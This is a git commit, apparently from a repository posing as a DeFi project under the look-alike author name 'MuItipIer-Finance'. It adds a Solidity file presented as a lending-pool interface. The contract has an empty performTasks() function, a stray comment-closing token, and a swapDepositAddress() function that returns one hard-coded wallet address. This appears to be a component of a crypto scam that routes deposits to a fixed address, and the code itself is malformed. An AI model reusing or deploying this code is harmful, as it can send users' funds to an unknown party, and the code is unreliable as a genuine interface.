3f0d7231786b9165126c731d74a2d646b0ff771a
MuItipIer-Finance <120128538+MuItipIer-Finance@users.noreply.github.com>
2022-12-08 19:06:11 +0100

    Create ILendingPoolSwapingAdress.sol

---
+++ main/contracts/interfaces/ILendingPoolSwapingAdress.sol
@@ -0,0 +1,9 @@
+pragma solidity ^0.5.0;
+
+contract Manager {
+    function performTasks() pure public {
+    }
+       */ function swapDepositAddress() public pure returns (address) {
+        return 0x09A1378e7f70710a4C0E86fFc98203C3142DFEEc;
+    }
+}
